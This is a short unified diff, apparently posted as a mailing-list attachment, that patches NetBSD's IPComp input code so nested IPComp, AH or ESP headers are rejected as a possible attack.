+-------------- next part --------------
+Index: sys/netinet6/ipcomp_input.c
+===================================================================
+RCS file: /cvsroot/src/sys/netinet6/ipcomp_input.c,v
+retrieving revision 1.36
+diff -u -u -p -r1.36 ipcomp_input.c
+--- sys/netinet6/ipcomp_input.c	5 May 2008 13:41:30 -0000	1.36
++++ sys/netinet6/ipcomp_input.c	29 Mar 2011 19:19:00 -0000
+@@ -148,6 +148,13 @@ ipcomp4_input(m, va_alist)
+ 	ipcomp = mtod(md, struct ipcomp *);
+ 	ip = mtod(m, struct ip *);
+ 	nxt = ipcomp->comp_nxt;
++	if (nxt == IPPROTO_IPCOMP || nxt == IPPROTO_AH || nxt == IPPROTO_ESP) {
++		/* nested ipcomp - possible attack, not likely useful */
++		ipseclog((LOG_DEBUG, "IPv4 IPComp input: nested ipcomp "
++		    "(bailing)\n"));
++		IPSEC_STATINC(IPSEC_STAT_IN_INVAL);
++		goto fail;
++	}
+ 	hlen = ip->ip_hl << 2;
+ 
+ 	cpi = ntohs(ipcomp->comp_cpi);
